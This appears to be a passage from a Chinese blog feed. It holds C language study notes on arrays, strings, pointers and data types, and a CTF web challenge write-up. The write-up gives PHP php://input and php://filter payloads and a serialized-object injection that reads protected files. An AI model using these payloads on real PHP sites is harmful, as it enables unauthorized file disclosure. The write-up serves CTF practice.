class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
</li>
<li><p>第五种：C99 增加了一种新特性——指定初始化的元素。这样就可以只对数组中的某些指定元素进行初始化赋值，而未被赋值的元素自动初始化为 0</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 编译的时候记得加上–std=c99选项</span></code></pre>
</li>
</ul>
<hr>
<hr>
<h2 id="字符串处理函数"><a href="#字符串处理函数" class="headerlink" title="字符串处理函数"></a><strong>字符串处理函数</strong></h2><h3 id="字符数组"><a href="#字符数组" class="headerlink" title="字符数组"></a>字符数组</h3><ul>
<li>两种方式存放和表达字符串：1.字符串常量2.字符类型的数组</li>
<li>字符数组</li>
</ul>
<blockquote>
<p>可以先定义指定长度的字符数组，然后再给每个元素单独赋值：</p>
</blockquote>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> main
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'N'</span><span class="token punctuation">;</span>
    str<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'i'</span><span class="token punctuation">;</span>
    str<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'n'</span><span class="token punctuation">;</span>
    str<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'e'</span><span class="token punctuation">;</span>
    str<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'s'</span><span class="token punctuation">;</span>
    str<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>

    ……
<span class="token punctuation">}</span></code></pre>
<blockquote>
<p>还可以直接在定义的时候对字符数组进行初始化，这样会方便很多：</p>
</blockquote>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> main
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// 初始化字符数组的每个元素</span>
    <span class="token keyword">char</span> str1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'N'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// 可以不写元素的个数，因为编译器会自动计算</span>
    <span class="token keyword">char</span> str3<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'N'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// 使用字符串常量初始化字符数组</span>
    <span class="token keyword">char</span> str4<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"Nines"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// 使用字符串常量初始化，可以省略大括号</span>
    <span class="token keyword">char</span> str5<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Nines"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<hr>
<h3 id="字符串处理函数-1"><a href="#字符串处理函数-1" class="headerlink" title="字符串处理函数"></a>字符串处理函数</h3><ul>
<li>获取字符串的长度：strlen 函数</li>
</ul>
<p>拷贝字符串：strcpy 函数和 strncpy 函数</p>
<p>连接字符串：strcat 函数和 strncat 函数</p>
<p>比较字符串：strcmp 函数和 strncmp 函数</p>
<hr>
<hr>
<h2 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a><strong>二维数组</strong></h2><h3 id="1-二维数组的定义"><a href="#1-二维数组的定义" class="headerlink" title="1.二维数组的定义"></a>1.二维数组的定义</h3><ul>
<li>定义二维数组的方法跟一维数组相似，使用方括号指定每个维度的元素个数：</li>
</ul>
<blockquote>
<p>类型 数组名[常量表达式][常量表达式]</p>
</blockquote>
<blockquote>
<p><font color="red">注意</font>：这里需要强调的是几行几列我们是从概念模型上来看的，也就是说，这样来看待二维数组，我们可以更容易理解。但从物理模型上看，无论是二维数组还是更多维的数组，在内存中仍然是以线性的方式存储的。</p>
</blockquote>
<h3 id="2-二维数组的访问"><a href="#2-二维数组的访问" class="headerlink" title="2.二维数组的访问"></a>2.二维数组的访问</h3><ul>
<li>数组名[下标]:<pre class=" language-c"><code class="language-c">a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 访问a数组中第1行第1列的元素</span>
b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 访问b数组中第2行第4列的元素</span></code></pre>
</li>
<li><font color="red">要防止数组越界</font></li>
</ul>
<h3 id="3-二维数组的初始化"><a href="#3-二维数组的初始化" class="headerlink" title="3.二维数组的初始化"></a>3.二维数组的初始化</h3><ul>
<li><p>由于二维数组在内存中是线性存放的，因此可以将数据写在一个花括号内</p>
</li>
<li><p>为了更直观地表示元素的分布，可以用大括号将每一行的元素括起来</p>
</li>
<li><p>二维数组也可以仅对部分元素赋初值</p>
</li>
<li><p>C99 同样增加了一种新特性：指定初始化的元素。这样就可以只对数组中的某些指定元素进行初始化赋值，而未被赋值的元素自动初始化为 0</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
</li>
<li><p>二维数组也可以让编译器根据元素的数量计算数组的长度。但只有第 1 维的元素个数可以不写，其他维度必须写上</p>
</li>
</ul>
<hr>
<hr>
<h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a><strong>指针</strong></h2><h3 id="1-内存存放变量"><a href="#1-内存存放变量" class="headerlink" title="1.内存存放变量"></a>1.内存存放变量</h3><ul>
<li>通过变量名对变量进行访问和存储是为了方便程序员而设计的，其实在内存中完全没有存储变量名的必要。因为编译器知道具体每一个变量名对应的存放地址，所以当你读取某个变量的时候，编译器就会找到变量名所在的地址，并根据变量的类型读取相应范围的数据。</li>
</ul>
<h3 id="2-指针和指针变量"><a href="#2-指针和指针变量" class="headerlink" title="2.指针和指针变量"></a>2.指针和指针变量</h3><ul>
<li>通常我们所说的指针，就是地址的意思。C 语言中有专门的指针变量用于存放指针，跟普通变量不同，指针变量存储的是一个地址。</li>
<li>指针变量也有类型，它的类型就是存放的地址指向的数据类型。</li>
</ul>
<h3 id="3-定义指针变量"><a href="#3-定义指针变量" class="headerlink" title="3.定义指针变量"></a>3.定义指针变量</h3><ul>
<li>定义指针变量跟普通变量十分相似，只是中间多了一个星号（*）<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span></code></pre>
</li>
<li>左侧的数据类型表示指针变量中存放的地址指向的内存单元的数据类型</li>
</ul>
<h3 id="4-取地址运算符和取值运算符"><a href="#4-取地址运算符和取值运算符" class="headerlink" title="4.取地址运算符和取值运算符"></a>4.取地址运算符和取值运算符</h3><ul>
<li><p>如果需要获取某个变量的地址，可以使用取地址运算符（&amp;）</p>
</li>
<li><p>如果需要访问指针变量指向的数据，可以使用取值运算符（*）</p>
</li>
<li><p><font color="red">注意</font>：取值运算符跟定义指针用的都是星号（*），这属于符号的重用，在不同的地方有不同的意义：在定义时表示定义一个指针变量；在其他位置表示获取指针变量指向的变量的值</p>
</li>
<li><p><font color="red"><strong>避免访问未初始化指针</strong></font> </p>
</li>
</ul>
<hr>
<hr>
<h2 id="指针和数组"><a href="#指针和数组" class="headerlink" title="指针和数组"></a><strong>指针和数组</strong></h2><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h3><ul>
<li>数组不是指针</li>
<li>数组名是数组第一个元素的地址，也是数组的首地址<h3 id="2-指向数组的指针："><a href="#2-指向数组的指针：" class="headerlink" title="2.指向数组的指针："></a>2.指向数组的指针：</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>
p <span class="token operator">=</span> a<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 语句1</span>
p <span class="token operator">=</span> <span class="token operator">&amp;</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 语句2</span></code></pre>
<blockquote>
<p>因为数组名即数组第一个元素的地址，所以语句 1 和语句 2 是等价的，都是将数组 a 的首地址存放到指针变量 p 中。</p>
</blockquote>
</li>
</ul>
<h3 id="3-指针的运算"><a href="#3-指针的运算" class="headerlink" title="3.  指针的运算"></a>3.  指针的运算</h3><ul>
<li><p>当指针指向数组元素的时候，我们可以对指针变量进行加减运算，这样做的意义相当于指向距离指针所在位置向前或向后第 n 个元素。比如 p+1 表示指向 p 指针指向的元素的下一个元素；p-1 则表示指向上一个元素。</p>
</li>
<li><p><font color="red">注意</font>：p+1 并不是简单地将地址加1，而是指向数组的下一个元素</p>
</li>
</ul>
<hr>
<hr>
<h2 id="指针数组和数组指针"><a href="#指针数组和数组指针" class="headerlink" title="指针数组和数组指针"></a><strong>指针数组和数组指针</strong></h2><h3 id="1-指针和数组的区别"><a href="#1-指针和数组的区别" class="headerlink" title="1. 指针和数组的区别"></a>1. 指针和数组的区别</h3><ul>
<li>指针是左值</li>
<li>而数组名只是一个地址常量，它不可以被修改，所以数组名不是左值。</li>
</ul>
<h3 id="2-指针数组"><a href="#2-指针数组" class="headerlink" title="2. 指针数组"></a>2. 指针数组</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token operator">*</span>p1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
<ul>
<li><font color="blue">指针数组是一个数组，每个数组元素存放一个指针变量。</font></li>
</ul>
<h3 id="3-数组指针"><a href="#3-数组指针" class="headerlink" title="3.数组指针"></a>3.数组指针</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>p2<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
<ul>
<li><font color="blue">数组指针是一个指针，它指向的是一个数组。</font></li>
</ul>
<hr>
<hr>
<h2 id="指针和二维数组"><a href="#指针和二维数组" class="headerlink" title="指针和二维数组"></a><strong>指针和二维数组</strong></h2><ul>
<li><p>在 C 语言中，二维数组的实现，只是简单地通过“线性扩展”的方式进行。</p>
</li>
<li><p>要用指针来指向二维数组，需要使用数组指针的形式。</p>
</li>
</ul>
<hr>
<hr>
<h2 id="void指针和NULL指针"><a href="#void指针和NULL指针" class="headerlink" title="void指针和NULL指针"></a><strong>void指针和NULL指针</strong></h2><h3 id="1-void类型"><a href="#1-void类型" class="headerlink" title="1.void类型"></a>1.void类型</h3><ul>
<li>void 即的字面意思是“无类型”，定义变量的时候，我们通过类型来决定该变量所占的内存空间。</li>
</ul>
<h3 id="2-void指针"><a href="#2-void指针" class="headerlink" title="2.void指针"></a>2.void指针</h3><ul>
<li>void 指针我们把它称之为通用指针，就是可以指向任意类型的数据。也就是说，任何类型的指针都可以赋值给 void 指针。</li>
</ul>
<blockquote>
<p>不要直接对 void 指针进行解引用，因为编译器不知道它所指向的数据类型</p>
</blockquote>
<blockquote>
<p>使用 void 指针一定要小心，由于 void 指针可以包罗万象的特性，间接使得不同类型的指针转换变为合法</p>
</blockquote>
<h3 id="3-NULL指针"><a href="#3-NULL指针" class="headerlink" title="3.NULL指针"></a>3.NULL指针</h3><ul>
<li><p>如果一个指针不指向任何数据，我们就称之为空指针，用 NULL 表示。</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> NULL ((void *)0)</span></code></pre>
</li>
<li><p>地址 0 通常是一个不被使用的地址。所以，如果一个指针指向 NULL，那么就意味着该指针不指向任何东西。</p>
</li>
<li><p><font color="red">当你还不清楚要将指针初始化为什么地址时，请将它初始化 NULL；在对指针进行解引用时，先检查该指针是否为 NULL。这种策略可以为你今后编写大型程序节省大量的调试时间。</font></p>
</li>
</ul>
]]></content>
      <categories>
        <category>C语言</category>
        <category>编程</category>
      </categories>
      <tags>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>GUETCTF-WEB3-writeup</title>
    <url>/2019/10/26/GUETCTF_web3_wp/</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="GUETCTF-web3-wp"><a href="#GUETCTF-web3-wp" class="headerlink" title="GUETCTF-web3-wp"></a>GUETCTF-web3-wp</h2><p>打开网页是一个登陆界面，f12查看源码：</p>
<a id="more"></a>

<pre><code>&lt;!--  
$user = $_GET[&quot;username&quot;];  
$file = $_GET[&quot;file&quot;];  
$pass = $_GET[&quot;pass&quot;];  

if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)===&quot;i-am-admin&quot;)){  
    echo &quot;hello admin!&lt;br&gt;&quot;;  
    include($file); //hint.php  
}else{  
    echo &quot;you are not admin ! &quot;;  
}  
 --&gt;  </code></pre><hr>
<ol>
<li>一开始直接让<strong>username=i-am-admin</strong>但登陆失败</li>
</ol>
<p>发现思路是<font color="green">让file_get_content($user,’r’)===”i-am-admin”，所以要用伪协议php://input传入参数</font>。</p>
<blockquote>
<p>php：//input可以得到原始的post数据</p>
</blockquote>
<hr>
<ol start="2">
<li>接下来要想办法<strong>包含hint.php</strong></li>
</ol>
<ul>
<li>这里用到php的另一个封装协议：php://filter<br>利用这个协议就可以读取任意文件<br><font color="green">利用方法：php://filter/convert.base64-encode/resource=hint.php</font></li>
</ul>
<p>这里把读取到的hint.php的内容转换为base64的格式，<br>于是构造payload:</p>
<pre><code>?user=php://input&amp;file=php://filter/convert.base64-encode/resource=hint.php</code></pre><p>在线解码后得到hint.php</p>
<pre><code>&lt;?php  
error_reporting(0);
class Flag{//flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this-&gt;file)){  
            echo file_get_contents($this-&gt;file); 
            echo &quot;&lt;br&gt;&quot;;
        return (&quot;This is your flag!&quot;);
        }  
    }  
}  
?&gt;  </code></pre><hr>
<p>但我们不能直接访问flag.php，因为</p>
<pre><code>if(preg_match(&quot;/flag/&quot;,$file)){
        exit();</code></pre><p>回到源码发现需要用<strong>反序列化</strong>读取flag.php文件<br>于是根据hint.php构造</p>
<pre><code>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;}</code></pre><p>得到一串base64直接解码就能得到flag</p>
<hr>
<p>总的payload是:</p>
<pre><code>?user=php://input&amp;file=hint.php&amp;pass=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;}</code></pre><p>(同时post参数i-am-admin)</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Writeup</category>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言学习笔记</title>
    <url>/2020/05/05/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="C语言学习笔记"><a href="#C语言学习笔记" class="headerlink" title="C语言学习笔记"></a>C语言学习笔记</h1><hr>
<p>[TOC]</p>
<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a><strong>数据类型</strong></h2><h3 id="1-基本类型"><a href="#1-基本类型" class="headerlink" title="1.基本类型"></a>1.基本类型</h3><ul>
<li>整数型：int、short int、long int、long long int<blockquote>
<p>short int ≤ int ≤ long int≤ long long int</p>
</blockquote>
</li>
<li>浮点型：float、double、long double</li>
<li>字符型：char</li>
<li>布尔型：_Bool</li>
<li>枚举型(不常用)：enum</li>
</ul>
<hr>
<h4 id="sizeof运算符"><a href="#sizeof运算符" class="headerlink" title="sizeof运算符"></a>sizeof运算符</h4><blockquote>
<ul>
<li>概念：sizeof运算符用于获得数据类型或表达式长度</li>
<li>用法：</li>
</ul>
</blockquote>
<pre class=" language-c"><code class="language-c"><span class="token keyword">sizeof</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//查看对象长度 等价于sizeof object;</span>
<span class="token keyword">sizeof</span><span class="token punctuation">(</span>type_name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//查看数据类型</span></code></pre>
<hr>
<h4 id="类型限制符"><a href="#类型限制符" class="headerlink" title="类型限制符"></a>类型限制符</h4><blockquote>
<ul>
<li>signed：表示变量带符号位（可存放负数）</li>
<li>unsigned：表示变量不带符号位（不能存放负数，但意味着<font color="red">能存放更大的值</font>）</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>用法：<blockquote>
<ul>
<li>[signed] short [int]</li>
<li>unsigned short [int]</li>
<li>[signed] int</li>
<li>unsigned int</li>
<li>[signed] long [int]</li>
<li>unsigned long [int]</li>
<li>[signed] long long [int]</li>
<li>unsigned long long [int]</li>
</ul>
</blockquote>
</li>
</ul>
</blockquote>
<h3 id="2-指针类型"><a href="#2-指针类型" class="headerlink" title="2.指针类型"></a>2.指针类型</h3><h3 id="3-构造类型"><a href="#3-构造类型" class="headerlink" title="3.构造类型"></a>3.构造类型</h3><ul>
<li><p>数组类型</p>
</li>
<li><p>结构类型</p>
</li>
<li><p>联合类型</p>
</li>
</ul>
<h3 id="4-空类型"><a href="#4-空类型" class="headerlink" title="4.空类型"></a>4.空类型</h3><hr>
<hr>
<h2 id="取值范围"><a href="#取值范围" class="headerlink" title="取值范围"></a><strong>取值范围</strong></h2><h3 id="1-单位"><a href="#1-单位" class="headerlink" title="1.单位"></a>1.单位</h3><ul>
<li>比特位（bit）:CPU能读懂的最小单位</li>
<li>字节（Byte）：内存机构的最小寻址单位</li>
<li>换算：1 Byte == 8 bit</li>
</ul>
<hr>
<h3 id="2-进制换算"><a href="#2-进制换算" class="headerlink" title="2.进制换算"></a>2.进制换算</h3><table>
<thead>
<tr>
<th>二进制</th>
<th>十进制</th>
<th>十六进制</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>1</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>10</td>
<td>2</td>
<td>2</td>
</tr>
<tr>
<td>11</td>
<td>3</td>
<td>3</td>
</tr>
<tr>
<td>100</td>
<td>4</td>
<td>4</td>
</tr>
<tr>
<td>101</td>
<td>5</td>
<td>5</td>
</tr>
<tr>
<td>110</td>
<td>6</td>
<td>6</td>
</tr>
<tr>
<td>111</td>
<td>7</td>
<td>7</td>
</tr>
<tr>
<td>1000</td>
<td>8</td>
<td>8</td>
</tr>
<tr>
<td>1001</td>
<td>9</td>
<td>9</td>
</tr>
<tr>
<td>1010</td>
<td>10</td>
<td>A</td>
</tr>
<tr>
<td>1011</td>
<td>11</td>
<td>B</td>
</tr>
<tr>
<td>1100</td>
<td>12</td>
<td>C</td>
</tr>
<tr>
<td>1101</td>
<td>13</td>
<td>D</td>
</tr>
<tr>
<td>1110</td>
<td>14</td>
<td>E</td>
</tr>
<tr>
<td>1111</td>
<td>15</td>
<td>F</td>
</tr>
<tr>
<td>10000</td>
<td>16</td>
<td>10</td>
</tr>
<tr>
<td>10001</td>
<td>17</td>
<td>11</td>
</tr>
<tr>
<td>…</td>
<td>…</td>
<td>…</td>
</tr>
<tr>
<td>11111111</td>
<td>255</td>
<td>FF</td>
</tr>
</tbody></table>
<ul>
<li>十进制二进制转换：2的n次方减1</li>
</ul>
<hr>
<h3 id="3-符号位"><a href="#3-符号位" class="headerlink" title="3.符号位"></a>3.符号位</h3><ul>
<li><p>存放signed的类型的储存单元中，左边第一位表示符号位，如果该位为1就表示该数为负，如果该位为0就表示该数为正</p>
</li>
<li><p>一个32位的整形变量，除去左边第一个符号位，剩下表示的值只有31个比特位</p>
</li>
</ul>
<hr>
<h3 id="4-补码"><a href="#4-补码" class="headerlink" title="4.补码"></a>4.补码</h3><ul>
<li><p>正数的补码是该数的二进制形式</p>
</li>
<li><p>负数的补码通过几个步骤取得：</p>
<p>1.先取得该数的绝对值的二进制形式</p>
<p>2.将第一步的值按位取反（把1变为0，把0变成1）</p>
<p>3.将第二步的值加一</p>
</li>
</ul>
<hr>
<h3 id="5-基本数据类型的取值范围"><a href="#5-基本数据类型的取值范围" class="headerlink" title="5.基本数据类型的取值范围"></a>5.基本数据类型的取值范围</h3><table>
<thead>
<tr>
<th>数据类型</th>
<th>字节数</th>
<th>取值范围</th>
</tr>
</thead>
<tbody><tr>
<td>char</td>
<td>1</td>
<td>-128 ~ 127</td>
</tr>
<tr>
<td>unsigned char</td>
<td>1</td>
<td>0 ~ 255</td>
</tr>
<tr>
<td>short</td>
<td>2</td>
<td>-32768 ~ 32767</td>
</tr>
<tr>
<td>unsigned short</td>
<td>2</td>
<td>0 ~ 65535</td>
</tr>
<tr>
<td>int</td>
<td>4</td>
<td>-2147483648 ~ 2147483647</td>
</tr>
<tr>
<td>unsigned int</td>
<td>4</td>
<td>0 ~ 4294967295</td>
</tr>
<tr>
<td>long</td>
<td>4</td>
<td>-2147483648 ~ 2147483647</td>
</tr>
<tr>
<td>unsigned long</td>
<td>4</td>
<td>0 ~ 4294967295</td>
</tr>
<tr>
<td>long long</td>
<td>8</td>
<td>-9223372036854775808 ~ 9223372036854775807</td>
</tr>
<tr>
<td>unsigned long long</td>
<td>8</td>
<td>0 ~ 18446744073709551615</td>
</tr>
<tr>
<td>float</td>
<td>4</td>
<td>1.7549 * 10^-38 ~ 3.40282 * 10^38</td>
</tr>
<tr>
<td>double</td>
<td>8</td>
<td>2.22507 * 10^-308 ~ 1.79765 * 10^308</td>
</tr>
<tr>
<td>long double</td>
<td>12</td>
<td>2.22507 * 10^-308 ~ 1.79765 * 10^108</td>
</tr>
</tbody></table>
<hr>
<hr>
<h2 id="字符与字符串"><a href="#字符与字符串" class="headerlink" title="字符与字符串"></a><strong>字符与字符串</strong></h2><h3 id="1-ASCII表"><a href="#1-ASCII表" class="headerlink" title="1.ASCII表"></a>1.ASCII表</h3><p><img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1538458003104&di=4b3f3ad99e68ea4b01f90fe5504ee854&imgtype=0&src=http%3A%2F%2Fimg.bimg.126.net%2Fphoto%2FnjtcLwoNWZ51joclAWjzKw%3D%3D%2F308215099515025170.jpg" alt></p>
<h3 id="2-字符串"><a href="#2-字符串" class="headerlink" title="2.字符串"></a>2.字符串</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> 变量名<span class="token punctuation">[</span>数量<span class="token punctuation">]</span><span class="token punctuation">;</span>

变量名<span class="token punctuation">[</span>索引号<span class="token punctuation">]</span> <span class="token operator">=</span> 字符<span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">//声明字符串</span>
<span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">//给字符串赋值</span>
name<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'N'</span><span class="token punctuation">;</span>
name<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'i'</span><span class="token punctuation">;</span>
name<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'n'</span><span class="token punctuation">;</span>
name<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'e'</span><span class="token punctuation">;</span>
name<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'K'</span><span class="token punctuation">;</span></code></pre>
<ul>
<li>注意在末尾添加\0 , 否则会出现乱码</li>
</ul>
<hr>
<hr>
<h2 id="字符与字符串-1"><a href="#字符与字符串-1" class="headerlink" title="字符与字符串"></a><strong>字符与字符串</strong></h2><h3 id="运算符："><a href="#运算符：" class="headerlink" title="运算符："></a>运算符：</h3><ul>
<li>C语言通过提供运算符来支持我们对数据的处理</li>
</ul>
<h4 id="1-算术运算符"><a href="#1-算术运算符" class="headerlink" title="1.算术运算符:"></a>1.算术运算符:</h4><p><img src="https://fishc.com.cn/forum.php?mod=image&aid=41750&size=400x300&key=3d2c5badf61607a4&type=1" alt></p>
<ul>
<li>目：操作数的个数</li>
<li>表达式：用运算符和括号将操作数连接起来的式子<br>比如：1 + 1、a + b</li>
</ul>
<ul>
<li>类型转换：<br>(数据类型)值</li>
</ul>
<hr>
<h4 id="2-关系运算符"><a href="#2-关系运算符" class="headerlink" title="2.关系运算符"></a>2.关系运算符</h4><ul>
<li>使用关系运算符来比较两个数的大小关系</li>
</ul>
<p><img src="https://fishc.com.cn/forum.php?mod=image&aid=41978&size=400x300&key=879f47f9d6645672&type=1" alt></p>
<ul>
<li>关系表达式：用关系运算符将两边的变量、数据或表达式连接起来，称之为关系表达式</li>
</ul>
<blockquote>
<p>如：1&lt;2、a&gt;b、(a=3) &gt; (b=5)</p>
</blockquote>
<blockquote>
<p>关系表达式得到的值是一个逻辑值，即判断结果为“真”或“假”，如果结果为“真”，关系表达式的值为 1，如果为“假”，关系表达式的值则为 0。</p>
</blockquote>
<hr>
<h4 id="3-逻辑运算符"><a href="#3-逻辑运算符" class="headerlink" title="3..逻辑运算符"></a>3..逻辑运算符</h4><ul>
<li><p>C语言总共提供了三种逻辑运算符：<br><img src="https://fishc.com.cn/forum.php?mod=image&aid=41969&size=400x300&key=c0bbd69ffca9fa16&type=1" alt></p>
</li>
<li><p>逻辑表达式：用逻辑运算符将两边的变量、数据或表达式连接起来，称之为逻辑表达式</p>
</li>
</ul>
<blockquote>
<p>如:3 &gt; 1 &amp;&amp; 1 &lt; 2</p>
</blockquote>
<ul>
